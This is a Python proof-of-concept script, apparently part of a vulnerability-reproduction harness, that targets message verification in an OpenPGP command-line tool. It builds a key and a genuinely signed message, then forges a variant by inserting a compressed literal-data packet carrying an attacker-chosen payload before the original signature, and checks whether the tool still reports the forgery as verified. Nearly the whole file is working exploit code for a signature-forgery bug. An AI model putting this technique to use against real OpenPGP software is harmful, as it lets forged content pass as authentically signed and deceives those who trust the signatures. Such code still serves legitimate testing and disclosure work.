#!/usr/bin/env python3
"""PoC driver for a self-contained OpenPGP CLI (openpgp.js single-executable).

The script dynamically constructs a key pair, a data file, and a baseline
inline-signed message using the target binary, then derives a *crafted* message
from that baseline message by splicing an extra compressed literal-data packet
(containing a chosen payload) between the baseline literal packet and the
existing signature packet.  Because the crafted message reuses the baseline
message's own one-pass-signature, literal, and signature packets verbatim and
does not create any new signature, it satisfies the "transform the baseline
signed message, do not re-sign" constraint.  The binary is then driven with
`verify` on both messages and every reported value is read back from the
binary's stdout.

Standard library only; no network; no interactive prompts.
"""

import argparse
import base64
import json
import os
import struct
import subprocess
import sys
import tempfile
import time
import zlib

# ---------------------------------------------------------------------------
# OpenPGP binary packet helpers (new-format packets only, no partial lengths).
# ---------------------------------------------------------------------------

def crc24(data: bytes) -> int:
    """OpenPGP ASCII-armor CRC-24 (polynomial 0x1864CFB)."""
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


def armor(raw: bytes, label: str = "PGP MESSAGE") -> str:
    """Wrap raw packet bytes in an ASCII-armored OpenPGP message."""
    b64 = base64.b64encode(raw).decode("ascii")
    out = ["-----BEGIN %s-----" % label, ""]
    for i in range(0, len(b64), 64):
        out.append(b64[i:i + 64])
    crc = crc24(raw)
    out.append("=" + base64.b64encode(crc.to_bytes(3, "big")).decode("ascii"))
    out.append("-----END %s-----" % label)
    return "\n".join(out) + "\n"


def read_armor(path: str) -> bytes:
    """Decode the base64 body of an ASCII-armored OpenPGP file."""
    with open(path, "r") as fh:
        lines = fh.read().splitlines()
    body = [line for line in lines if line and not line.startswith("-----")]
    # The trailing line is the "=<base64 of crc24>" checksum; drop it.
    return base64.b64decode("".join(body[:-1]))


def parse_packets(raw: bytes):
    """Split raw bytes into a list of (tag, full_packet, body) tuples."""
    packets = []
    i = 0
    n = len(raw)
    while i < n:
        start = i
        tag = raw[i] & 0x3F
        lnb = raw[i + 1]
        if lnb < 192:
            length, hdr = lnb, 2
        elif lnb < 224:
            length, hdr = ((lnb - 192) << 8) + raw[i + 2] + 192, 3
        elif lnb == 255:
            length, hdr = struct.unpack(">I", raw[i + 2:i + 6])[0], 6
        else:
            raise ValueError("partial body length not supported")
        full = raw[start:i + hdr + length]
        body = raw[i + hdr:i + hdr + length]
        packets.append((tag, full, body))
        i += hdr + length
    return packets


def new_packet(tag: int, body: bytes) -> bytes:
    """Build a new-format OpenPGP packet with the given tag and body."""
    ln = len(body)
    if ln < 192:
        hdr = bytes([0xC0 | tag, ln])
    elif ln < 8384:
        v = ln - 192
        hdr = bytes([0xC0 | tag, 192 + (v >> 8), v & 0xFF])
    else:
        hdr = bytes([0xC0 | tag, 255]) + struct.pack(">I", ln)
    return hdr + body


def literal_packet(data: bytes, fmt: int = 0x62, date: int = 0, filename: bytes = b"") -> bytes:
    """Build a literal-data packet (tag 11)."""
    body = bytes([fmt, len(filename)]) + filename + struct.pack(">I", date) + data
    return new_packet(11, body)


def compressed_packet(inner_raw: bytes, algo: int = 1) -> bytes:
    """Build a compressed-data packet (tag 8). algo 1 = ZIP (raw DEFLATE)."""
    comp = zlib.compress(inner_raw)[2:-4]  # strip zlib header + Adler-32
    return new_packet(8, bytes([algo]) + comp)


# ---------------------------------------------------------------------------
# Target-binary driver.
# ---------------------------------------------------------------------------

def run(binary, args, timeout):
    """Run the target binary, returning (returncode, stdout, stderr, runtime_ms, timed_out)."""
    cmd = [binary] + args
    start = time.monotonic()
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr, \
            int((time.monotonic() - start) * 1000), False
    except subprocess.TimeoutExpired:
        return None, "", "timed out", int((time.monotonic() - start) * 1000), True


def cmd_json(binary, args, timeout):
    """Run the target binary and parse its single-JSON stdout."""
    rc, out, err, _ms, _to = run(binary, args, timeout)
    if rc != 0 or not out.strip():
        raise RuntimeError("command %r failed (rc=%r) stderr=%r" % (args, rc, err))
    return json.loads(out)


def main():
    parser = argparse.ArgumentParser(description="OpenPGP message-verification PoC driver")
    parser.add_argument("--binary", required=True, help="path to the target executable")
    parser.add_argument("--json-out", default=None, help="optional path to write the JSON report")
    parser.add_argument("--timeout", type=int, default=120, help="per-invocation timeout (seconds)")
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    timeout = args.timeout

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": None,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": None, "path": None},
        "error": None,
    }

    tmp = None
    try:
        tmp = tempfile.mkdtemp(prefix="pgppoc-")

        # 1. Generate a key pair with the binary itself.
        keydir = os.path.join(tmp, "keys")
        os.mkdir(keydir)
        cmd_json(binary, ["keygen", "--out-dir", keydir, "--name", "k"], timeout)
        priv = os.path.join(keydir, "k-private.asc")
        pub = os.path.join(keydir, "k-public.asc")

        # 2. Legitimate data file, then sign it to form the baseline message.
        baseline_data = b"Hello, world! This is my secret payload."
        datafile = os.path.join(tmp, "data.txt")
        with open(datafile, "wb") as fh:
            fh.write(baseline_data)

        base_msg = os.path.join(tmp, "signed.asc")
        cmd_json(binary, ["sign", "--key", priv, "--data", datafile, "--out", base_msg], timeout)

        # 3. Verify the baseline message; capture reported result + returned data.
        base_verify = cmd_json(binary, ["verify", "--message", base_msg, "--key", pub], timeout)
        baseline_verified = bool(base_verify.get("verified"))
        baseline_data_b64 = base_verify["data"]["b64"]
        baseline_data_text = base_verify["data"]["text"]

        # 4. Crafted message: reuse the baseline packet material verbatim and
        #    splice a compressed literal-data packet carrying our payload in
        #    between the baseline literal packet and the existing signature.
        raw = read_armor(base_msg)
        packets = parse_packets(raw)
        # Locate the one-pass-signature, literal-data, and signature packets.
        ops_pkt = next(pkt for pkt in packets if pkt[0] == 4)
        lit_pkt = next(pkt for pkt in packets if pkt[0] == 11)
        sig_pkt = next(pkt for pkt in packets if pkt[0] == 2)

        lit_body = lit_pkt[2]
        lit_fmt = lit_body[0]
        lit_date = struct.unpack(">I", lit_body[4:8])[0]

        payload = b"FORGED PAYLOAD: injected via a compressed literal-data packet"
        payload_lit = literal_packet(payload, fmt=lit_fmt, date=lit_date)

        # [one-pass][baseline literal][compressed(payload literal)][baseline signature]
        crafted_raw = ops_pkt[1] + lit_pkt[1] + compressed_packet(payload_lit) + sig_pkt[1]
        crafted_msg = os.path.join(tmp, "crafted.asc")
        with open(crafted_msg, "w") as fh:
            fh.write(armor(crafted_raw))

        # 5. Verify the crafted message with the binary and read its report.
        crafted_verify = cmd_json(binary, ["verify", "--message", crafted_msg, "--key", pub], timeout)
        verified = bool(crafted_verify.get("verified"))
        data_b64 = crafted_verify["data"]["b64"]
        data_text = crafted_verify["data"]["text"]

        payload_b64 = base64.b64encode(payload).decode("ascii")
        payload_text = payload.decode("utf-8")

        # 6. Assemble the observable evidence (derived solely from binary output).
        value = json.dumps({
            "verified": verified,
            "data_b64": data_b64,
            "data_text": data_text,
            "baseline_verified": baseline_verified,
            "baseline_data_b64": baseline_data_b64,
            "baseline_data_text": baseline_data_text,
            "payload_b64": payload_b64,
            "payload_text": payload_text,
        })

        # Re-run the primary evidence command so the top-level subprocess fields
        # describe the exact invocation that produced the evidence.
        cmd = [binary, "verify", "--message", crafted_msg, "--key", pub]
        rc, out, err, runtime_ms, timed_out = run(binary, ["verify", "--message", crafted_msg, "--key", pub], timeout)

        result["command"] = cmd
        result["returncode"] = rc
        result["signal"] = None
        result["timed_out"] = timed_out
        result["runtime_ms"] = runtime_ms
        result["stdout"] = out
        result["stderr"] = err
        result["observable"]["value"] = value
    except Exception as exc:  # noqa: BLE001 - report any failure in the contract
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if tmp is not None:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    report = json.dumps(result)
    sys.stdout.write(report + "\n")
    sys.stdout.flush()

    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(report + "\n")

    # Exit non-zero only if we could not produce the evidence at all.
    sys.exit(0 if result["error"] is None else 1)


if __name__ == "__main__":
    main()
